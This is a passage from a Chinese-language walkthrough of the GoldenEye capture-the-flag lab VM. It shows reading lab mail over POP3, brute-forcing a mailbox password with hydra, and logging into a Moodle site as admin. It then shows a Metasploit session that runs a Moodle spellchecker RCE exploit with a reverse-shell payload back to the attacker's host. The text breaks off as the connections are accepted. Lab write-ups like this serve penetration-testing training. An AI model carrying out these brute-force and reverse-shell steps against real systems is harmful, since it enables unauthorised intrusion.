-0700 (PDT)</span></span><br><span class="line"><span class="string">From: alec@janus.boss</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Boris,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PS - Keep security tight or we will be compromised.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>

<p>有一份文件用了GoldenEye的访问代码作为附件进行发送，存在根目录</p>
<p>查看natalya</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi/tmp]</span><br><span class="line">└─<span class="comment"># nc 192.168.3.13 55007</span></span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user natalya</span><br><span class="line">+OK</span><br><span class="line">pass bird</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">list</span><br><span class="line">+OK 2 messages:</span><br><span class="line">1 631</span><br><span class="line">2 1048</span><br><span class="line">.</span><br><span class="line">retr 1</span><br><span class="line">+OK 631 octets</span><br><span class="line">Return-Path: &lt;root@ubuntu&gt;</span><br><span class="line">X-Original-To: natalya</span><br><span class="line">Delivered-To: natalya@ubuntu</span><br><span class="line">Received: from ok (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with ESMTP <span class="built_in">id</span> D5EDA454B1</span><br><span class="line">        <span class="keyword">for</span> &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;</span><br><span class="line">Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)</span><br><span class="line">From: root@ubuntu</span><br><span class="line"></span><br><span class="line">Natalya, please you need to stop breaking boris<span class="string">&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">retr 2</span></span><br><span class="line"><span class="string">+OK 1048 octets</span></span><br><span class="line"><span class="string">Return-Path: &lt;root@ubuntu&gt;</span></span><br><span class="line"><span class="string">X-Original-To: natalya</span></span><br><span class="line"><span class="string">Delivered-To: natalya@ubuntu</span></span><br><span class="line"><span class="string">Received: from root (localhost [127.0.0.1])</span></span><br><span class="line"><span class="string">        by ubuntu (Postfix) with SMTP id 17C96454B1</span></span><br><span class="line"><span class="string">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: root@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;</span>s related to security...even <span class="keyword">if</span> it<span class="string">&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;</span>ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And <span class="keyword">if</span> you didn<span class="string">&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span></span><br><span class="line"><span class="string">**Make sure to edit your host file since you usually work remote off-network....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Since you&#x27;</span>re a Linux user just point this servers IP to severnaya-station.com <span class="keyword">in</span> /etc/hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个密码本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br></pre></td></tr></table></figure>

<p>以及域名绑定信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Since you&#x27;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br></pre></td></tr></table></figure>

<p>修改hosts后重新访问severnaya-station.com&#x2F;gnocertdir</p>
<p>whatweb扫描指纹</p>
<blockquote>
<p><code>whatweb</code> 是一个命令行工具，用于识别和分析网站的技术信息。它能够探测网站的服务器、操作系统、Web 应用程序、内容管理系统（如 WordPress、Joomla）、框架、库、版本号、安全性信息等。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># whatweb severnaya-station.com/gnocertdir</span></span><br><span class="line">http://severnaya-station.com/gnocertdir [301 Moved Permanently]</span><br><span class="line">  - Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">  - Country: RESERVED [ZZ]</span><br><span class="line">  - HTTP Server: Ubuntu Linux, Apache/2.4.7</span><br><span class="line">  - IP: 192.168.3.13</span><br><span class="line">  - Redirect: http://severnaya-station.com/gnocertdir/</span><br><span class="line">  - Title: 301 Moved Permanently</span><br><span class="line"></span><br><span class="line">http://severnaya-station.com/gnocertdir/ [200 OK]</span><br><span class="line">  - Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">  - Content-Language: en</span><br><span class="line">  - Cookies: MoodleSession</span><br><span class="line">  - Country: RESERVED [ZZ]</span><br><span class="line">  - HTTP Server: Ubuntu Linux, Apache/2.4.7</span><br><span class="line">  - IP: 192.168.3.13</span><br><span class="line">  - CMS: Moodle</span><br><span class="line">  - PHP Version: 5.5.9-1ubuntu4.24</span><br><span class="line">  - Scripts: footer, <span class="built_in">head</span>, text/css, text/javascript</span><br><span class="line">  - Title: GoldenEye Operators Training - Moodle</span><br><span class="line">  - Uncommon Headers: content-script-type, content-style-type</span><br><span class="line">  - X-Frame-Options: sameorigin</span><br><span class="line">  - X-Powered-By: PHP/5.5.9-1ubuntu4.24</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015195220289.png" alt="image-20241015195220289"></p>
<p>乱点一通发现需要登录</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015195241611.png" alt="image-20241015195241611"></p>
<p>使用对应的密码登录</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015195524962.png" alt="image-20241015195524962"></p>
<p>messages底下有个邮件</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015195759711.png" alt="image-20241015195759711"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Tuesday, 24 April 2018</span><br><span class="line">09:24 PM: Greetings Xenia,</span><br><span class="line"></span><br><span class="line">As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.</span><br><span class="line"></span><br><span class="line">My email username is...</span><br><span class="line"></span><br><span class="line">doak</span><br><span class="line"></span><br><span class="line">Thank you,</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span class="line"></span><br><span class="line">Dr. Doak &quot;The Doctor&quot;</span><br><span class="line">Training Scientist - Sr Level Training Operating Supervisor</span><br><span class="line">GoldenEye Operations Center Sector</span><br><span class="line">Level 14 - NO2 - id:998623-1334</span><br><span class="line">Campus 4, Building 57, Floor -8, Sector 6, cube 1,007</span><br><span class="line">Phone 555-193-826</span><br><span class="line">Cell 555-836-0944</span><br><span class="line">Office 555-846-9811</span><br><span class="line">Personal 555-826-9923</span><br><span class="line">Email: doak@</span><br><span class="line">Please Recycle before you print, Stay Green aka save the company money!</span><br><span class="line">&quot;There&#x27;s such a thing as Good Grief. Just ask Charlie Brown&quot; - someguy</span><br><span class="line">&quot;You miss 100% of the shots you don&#x27;t shoot at&quot; - Wayne G.</span><br><span class="line">THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS.</span><br></pre></td></tr></table></figure>

<p>新用户继续爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># hydra -l doak -P /usr/share/dict/cracklib-small -s 55007  192.168.3.13 pop3 -V -t 64 </span></span><br></pre></td></tr></table></figure>

<p>得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4England!</span><br></pre></td></tr></table></figure>

<p>切换用户登录cms，发现secret</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015200558094.png" alt="image-20241015200558094"></p>
<p>下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">007,</span><br><span class="line"></span><br><span class="line">I was able to capture this apps adm1n cr3ds through clear txt. </span><br><span class="line"></span><br><span class="line">Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. </span><br><span class="line"></span><br><span class="line">Something juicy is located here: /dir007key/for-007.jpg</span><br><span class="line"></span><br><span class="line">Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.</span><br><span class="line"></span><br><span class="line">007,</span><br><span class="line">我能够通过clear text捕获此应用程序adm 1 n cr 3ds。</span><br><span class="line">GoldenEye服务器内的大多数Web应用程序中的文本都会被扫描，因此我无法在此处添加cr 3收件箱。</span><br><span class="line">这里有一些有趣的东西：/dir007key/for-007.jpg</span><br><span class="line">另外，正如您可能知道的那样，HCP-90远远优于任何其他武器，而《杀戮许可证》是唯一的游戏方式。</span><br></pre></td></tr></table></figure>

<p>发现Something juicy is located here: &#x2F;dir007key&#x2F;for-007.jpg</p>
<p>访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://severnaya-station.com/dir007key/for-007.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015200823286.png" alt="image-20241015200823286"></p>
<p>得到key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xWinter1995x!</span><br></pre></td></tr></table></figure>

<p>以此密码登录admin</p>
<p>web端通了，于是想办法打进去</p>
<p>属于Moodle 2.2.3</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015201218051.png" alt="image-20241015201218051"></p>
<p>搜索相关漏洞执行后发现没能成功，搜索发现需要修改执行PSpellShell<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/29324">https://www.exploit-db.com/exploits/29324</a><br>‘s_editor_tinymce_spellengine’ &#x3D;&gt; ‘PSpellShell’,</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20241015202151300.png" alt="image-20241015202151300"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># msfconsole</span></span><br><span class="line">Metasploit tip: You can use <span class="built_in">help</span> to view all available commands</span><br><span class="line">                                                  </span><br><span class="line">                                              `:oDFo:`                            </span><br><span class="line">                                           ./ymM0dayMmy/.                          </span><br><span class="line">                                        -+dHJ5aGFyZGVyIQ==+-                    </span><br><span class="line">                                    `:sm⏣~~Destroy.No.Data~~s:`                </span><br><span class="line">                                 -+h2~~Maintain.No.Persistence~~h+-              </span><br><span class="line">                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          </span><br><span class="line">                          ./etc/shadow.0days-Data<span class="string">&#x27;%20OR%201=1--.No.0MN8&#x27;</span>/.      </span><br><span class="line">                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    </span><br><span class="line">                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  </span><br><span class="line">                      :dopeAW.No&lt;nano&gt;o                     :is:TЯiKC.sudo-.A:  </span><br><span class="line">                      :we<span class="string">&#x27;re.all.alike&#x27;</span>`                     The.PFYroy.No.D7:  </span><br><span class="line">                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    </span><br><span class="line">                      :msf&gt;exploit -j.                       :Ns.BOB&amp;ALICEes7:    </span><br><span class="line">                      :---srwxrwx:-.`                        `MS146.52.No.Per:    </span><br><span class="line">                      :&lt;script&gt;.Ac816/                        sENbove3101.404:    </span><br><span class="line">                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    </span><br><span class="line">                      :09.14.2011.raid                       /STFU|wall.No.Pr:    </span><br><span class="line">                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    </span><br><span class="line">                      :<span class="comment">#OUTHOUSE-  -s:                       /corykennedyData:    </span></span><br><span class="line">                      :<span class="variable">$nmap</span> -oS                              SSo.6178306Ence:    </span><br><span class="line">                      :Awsm.da:                            /shMTl<span class="comment">#beats3o.No.:    </span></span><br><span class="line">                      :Ring0:                             `dDestRoyREXKC3ta/M:    </span><br><span class="line">                      :23d:                               sSETEC.ASTRONOMYist:    </span><br><span class="line">                       /-                        /yo-    .ence.N:()&#123; :|: &amp; &#125;;:    </span><br><span class="line">                                                 `:Shall.We.Play.A.Game?tron/    </span><br><span class="line">                                                 ```-ooy.if1ghtf0r+ehUser5`    </span><br><span class="line">                                               ..th3.H1V3.U2VjRFNN.jMh+.`          </span><br><span class="line">                                              `MjM~~WE.ARE.se~~MMjMs              </span><br><span class="line">                                               +~KANSAS.CITY<span class="string">&#x27;s~-`                  </span></span><br><span class="line"><span class="string">                                                J~HAKCERS~./.`                    </span></span><br><span class="line"><span class="string">                                                .esc:wq!:`                        </span></span><br><span class="line"><span class="string">                                                 +++ATH`                            </span></span><br><span class="line"><span class="string">                                                  `</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v6.4.29-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 2458 exploits - 1261 auxiliary - 430 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]</span></span><br><span class="line"><span class="string">+ -- --=[ 9 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Metasploit Documentation: https://docs.metasploit.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">search Moodle</span></span><br><span class="line"><span class="string">msf6 &gt; search Moodle</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Matching Modules</span></span><br><span class="line"><span class="string">================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   #  Name                                                          Disclosure Date  Rank       Check  Description</span></span><br><span class="line"><span class="string">   -  ----                                                          ---------------  ----       -----  -----------</span></span><br><span class="line"><span class="string">   0  exploit/multi/http/moodle_admin_shell_upload                  2019-04-28       excellent  Yes    Moodle Admin Shell Upload</span></span><br><span class="line"><span class="string">   1  exploit/multi/http/moodle_spelling_binary_rce                 2013-10-30       excellent  Yes    Moodle Authenticated Spelling Binary RCE</span></span><br><span class="line"><span class="string">   2  exploit/multi/http/moodle_spelling_path_rce                   2021-06-22       excellent  Yes    Moodle SpellChecker Path Authenticated Remote Command Execution</span></span><br><span class="line"><span class="string">   3  exploit/multi/http/moodle_teacher_enrollment_priv_esc_to_rce  2020-07-20       good       Yes    Moodle Teacher Enrollment Privilege Escalation to RCE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/moodle_teacher_enrollment_priv_esc_to_rce</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 &gt; use 1</span></span><br><span class="line"><span class="string">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; info</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Name: Moodle Authenticated Spelling Binary RCE</span></span><br><span class="line"><span class="string">     Module: exploit/multi/http/moodle_spelling_binary_rce</span></span><br><span class="line"><span class="string">   Platform: Unix, Linux</span></span><br><span class="line"><span class="string">       Arch: cmd</span></span><br><span class="line"><span class="string"> Privileged: No</span></span><br><span class="line"><span class="string">    License: Metasploit Framework License (BSD)</span></span><br><span class="line"><span class="string">       Rank: Excellent</span></span><br><span class="line"><span class="string">  Disclosed: 2013-10-30</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Provided by:</span></span><br><span class="line"><span class="string">  Brandon Perry &lt;bperry.volatile@gmail.com&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module side effects:</span></span><br><span class="line"><span class="string"> config-changes</span></span><br><span class="line"><span class="string"> ioc-in-logs</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module stability:</span></span><br><span class="line"><span class="string"> crash-safe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module reliability:</span></span><br><span class="line"><span class="string"> repeatable-session</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Available targets:</span></span><br><span class="line"><span class="string">      Id  Name</span></span><br><span class="line"><span class="string">      --  ----</span></span><br><span class="line"><span class="string">  =&gt;  0   Automatic</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Check supported:</span></span><br><span class="line"><span class="string">  Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Basic options:</span></span><br><span class="line"><span class="string">  Name       Current Setting  Required  Description</span></span><br><span class="line"><span class="string">  ----       ---------------  --------  -----------</span></span><br><span class="line"><span class="string">  PASSWORD                    yes       Password to authenticate with</span></span><br><span class="line"><span class="string">  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span></span><br><span class="line"><span class="string">  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi</span></span><br><span class="line"><span class="string">                                        t.html</span></span><br><span class="line"><span class="string">  RPORT      80               yes       The target port (TCP)</span></span><br><span class="line"><span class="string">  SESSKEY                     no        The session key of the user to impersonate</span></span><br><span class="line"><span class="string">  SSL        false            no        Negotiate SSL/TLS for outgoing connections</span></span><br><span class="line"><span class="string">  TARGETURI  /moodle/         yes       The URI of the Moodle installation</span></span><br><span class="line"><span class="string">  USERNAME   admin            yes       Username to authenticate with</span></span><br><span class="line"><span class="string">  VHOST                       no        HTTP server virtual host</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload information:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Description:</span></span><br><span class="line"><span class="string">  Moodle allows an authenticated user to define spellcheck settings via the web interface.</span></span><br><span class="line"><span class="string">  The user can update the spellcheck mechanism to point to a system-installed aspell binary.</span></span><br><span class="line"><span class="string">  By updating the path for the spellchecker to an arbitrary command, an attacker can run</span></span><br><span class="line"><span class="string">  arbitrary commands in the context of the web application upon spellchecking requests.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  This module also allows an attacker to leverage another privilege escalation vuln.</span></span><br><span class="line"><span class="string">  Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey</span></span><br><span class="line"><span class="string">  and use this to escalate privileges to that of an admin, allowing the module to pop a shell</span></span><br><span class="line"><span class="string">  as a previously unprivileged authenticated user.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  This module was tested against Moodle version 2.5.2 and 2.2.3.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">References:</span></span><br><span class="line"><span class="string">  https://nvd.nist.gov/vuln/detail/CVE-2013-3630</span></span><br><span class="line"><span class="string">  https://nvd.nist.gov/vuln/detail/CVE-2013-4341</span></span><br><span class="line"><span class="string">  https://www.exploit-db.com/exploits/28174</span></span><br><span class="line"><span class="string">  https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">View the full module info with the info -d command.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; set username admin </span></span><br><span class="line"><span class="string">username =&gt; admin</span></span><br><span class="line"><span class="string">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; set password xWinter1995x! </span></span><br><span class="line"><span class="string">password =&gt; xWinter1995x!</span></span><br><span class="line"><span class="string">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; set rhost severnaya-station.com</span></span><br><span class="line"><span class="string">rhost =&gt; severnaya-station.com</span></span><br><span class="line"><span class="string">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; set targeturi /gnocertdir</span></span><br><span class="line"><span class="string">targeturi =&gt; /gnocertdir</span></span><br><span class="line"><span class="string">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; set payload cmd/unix/reverse </span></span><br><span class="line"><span class="string">payload =&gt; cmd/unix/reverse</span></span><br><span class="line"><span class="string">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; set lhost 192.168.3.11</span></span><br><span class="line"><span class="string">lhost =&gt; 192.168.3.11</span></span><br><span class="line"><span class="string">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; exploit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Started reverse TCP double handler on 192.168.3.11:4444 </span></span><br><span class="line"><span class="string">[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)</span></span><br><span class="line"><span class="string">[+] The target appears to be vulnerable. Exploitable Moodle version 2.2 detected</span></span><br><span class="line"><span class="string">[*] Authenticating as user: admin</span></span><br><span class="line"><span class="string">[*] Getting session key to update spellchecker if no session key was specified</span></span><br><span class="line"><span class="string">[*] Updating spellchecker to use the system aspell</span></span><br><span class="line"><span class="string">[*] Triggering payload</span></span><br><span class="line"><span class="string">[*] Accepted the first client connection...</span></span><br><span class="line"><span class="string">[*] Accepted the second client connection...</span></span><br><span class="line"><span 